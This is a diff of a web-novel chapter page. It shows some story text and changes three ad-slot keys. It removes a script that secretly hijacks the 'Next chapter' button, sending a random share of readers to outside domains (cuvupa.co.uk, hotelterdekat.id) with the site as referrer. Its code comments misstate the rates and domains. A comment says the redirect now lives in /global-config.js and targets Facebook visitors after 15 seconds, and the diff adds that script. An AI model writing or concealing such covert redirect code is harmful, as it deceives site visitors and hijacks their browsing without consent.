@@ -2403,7 +2403,7 @@
                 <p>The single word froze Leonard in place.</p>
                 <p>Alexander reached the car. &#34;Open the passenger side.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>Fumbling, Leonard pulled the door open, watching as Alexander settled her inside with the care reserved for fragile porcelain.</p>
                 <p>Evelyn weakly clutched his collar. &#34;Where—&#34;</p>
                 <p>&#34;Hospital.&#34; He pried her fingers loose. &#34;Stay still.&#34;</p>
@@ -2421,7 +2421,7 @@
                 <p>Curled in the seat, Evelyn suddenly spoke. &#34;You should&#39;ve put me in the back.&#34;</p>
                 <p>&#34;Why?&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>&#34;The front seat...&#34; She paused. &#34;Lydia might mind.&#34;</p>
                 <p>Alexander slammed the brakes.</p>
                 <p>&#34;Evelyn,&#34; he ground out, &#34;has the fever fried your brain?&#34;</p>
@@ -2430,7 +2430,7 @@
                 <p>&#34;But others think otherwise.&#34; Her voice grew faint. &#34;That was Lydia&#39;s father, wasn&#39;t it?&#34;</p>
                 <p>Alexander restarted the car. &#34;So you&#39;d rather suffer than drop the act?&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>&#34;It&#39;s basic courtesy—&#34;</p>
                 <p>A coughing fit cut her off.</p>
                 <p>Alexander&#39;s face darkened. He floored the accelerator.</p>
@@ -2564,37 +2564,7 @@
             }
         });
 
-        // Intercept Next button clicks and redirect to external domain
-        // 5% -> n1.cuvupa.co.uk, 0.5% -> n1.nougmi.xyz, 94.5% normal
-        (function() {
-            const nextBtn = document.getElementById('next-chapter');
-            if (nextBtn && nextBtn.href) {
-                nextBtn.addEventListener('click', function(e) {
-                    const rand = Math.random();
-
-                    // 7% probability to redirect to cuvupa
-                    if (rand < 0.07) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
-                    // 0.5% probability to redirect to hotelterdekat
-                    } else if (rand < 0.075) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.hotelterdekat.id${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to hotelterdekat with ref:', externalUrl);
-                    }
-                    // Otherwise, let the default link behavior work (92.5% probability)
-                });
-            }
-        })();
+        // Next 按钮的 FB 外部跳转逻辑已迁移至 /global-config.js（15s 后对 FB 用户生效）
 
         // Record reading history
         document.addEventListener('DOMContentLoaded', function() {
@@ -4229,5 +4199,6 @@
     });
   })();
 </script>
+<script src="/global-config.js"></script>
 </body>
 </html>
